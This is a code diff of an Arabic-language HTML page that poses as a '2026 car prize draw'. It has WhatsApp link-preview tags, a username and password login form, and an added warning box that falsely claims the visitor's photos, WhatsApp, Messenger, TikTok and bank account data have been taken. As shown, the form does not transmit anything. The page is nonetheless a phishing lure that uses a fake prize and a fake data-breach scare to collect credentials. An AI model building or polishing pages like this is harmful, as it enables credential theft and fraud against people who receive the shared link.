@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>سحب سيارة موديل 2026</title>
 
-    <!-- وسوم المعاينة لـ واتساب (النص المبدئي وصورة السيارة) -->
+    <!-- وسوم المعاينة لـ واتساب (الصورة والنص المبدئي) -->
     <meta property="og:title" content="سجل دخول للحصول على سحب سيارة موديل 2026">
     <meta property="og:description" content="سجل دخولك الآن وشارك في السحب على سيارة العام الجديد. فرصة محدودة!">
     <meta property="og:image" content="https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=1200&h=630&fit=crop">
@@ -17,15 +17,15 @@
             font-family: Tahoma, sans-serif;
             background-color: #f4f6f9;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
         }
         .container {
             background: #ffffff;
-            padding: 30px;
+            padding: 25px;
             border-radius: 12px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             width: 100%;
@@ -36,20 +36,28 @@
             color: #333;
             margin-bottom: 10px;
         }
+        /* تصميم القسم الثاني (التحذير والتفاصيل) */
         .alert-box {
             background-color: #ffebee;
             color: #c62828;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 14px;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 13px;
             font-weight: bold;
             margin-bottom: 20px;
             border: 1px solid #ffcdd2;
+            text-align: right;
+            line-height: 1.8;
+        }
+        .alert-box ul {
+            margin: 8px 0 0 0;
+            padding-right: 20px;
+            font-weight: normal;
         }
         input {
             width: 100%;
             padding: 12px;
-            margin: 10px 0;
+            margin: 8px 0;
             border: 1px solid #ddd;
             border-radius: 6px;
             box-sizing: border-box;
@@ -75,20 +83,29 @@
 <body>
 
     <div class="container">
+        <!-- القسم الأول: سحب السيارة وتسجيل الدخول -->
         <h2>سحب سيارة 2026</h2>
-        
-        <!-- القسم الداخلي كما طلبته -->
-        <div class="alert-box">
-            تم نقل كل بيانات هاتفك الى جهاز اخر بمدينه الرياض
-        </div>
-
-        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">الرجاء تسجيل الدخول للمتابعة</p>
+        <p style="color: #666; font-size: 14px; margin-bottom: 15px;">الرجاء تسجيل الدخول للمتابعة في السحب</p>
         
         <form onsubmit="event.preventDefault(); alert('تم استلام البيانات بنجاح!');">
             <input type="text" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
             <input type="password" placeholder="كلمة المرور" required>
             <button type="submit">تسجيل الدخول</button>
         </form>
+
+        <hr style="margin: 25px 0; border: none; border-top: 1px solid #eee;">
+
+        <!-- القسم الثاني: تفاصيل البيانات المنقولة -->
+        <div class="alert-box">
+            ⚠️ تنبيه هام: تم نقل كل بيانات هاتفك من جوجل بمدينة الرياض، وتتضمن البيانات الآتية:
+            <ul>
+                <li>صور جوجل</li>
+                <li>بيانات واتساب</li>
+                <li>بيانات ماسنجر</li>
+                <li>بيانات تيك توك</li>
+                <li>بيانات حساباتك البنكية</li>
+            </ul>
+        </div>
     </div>
 
 </body>
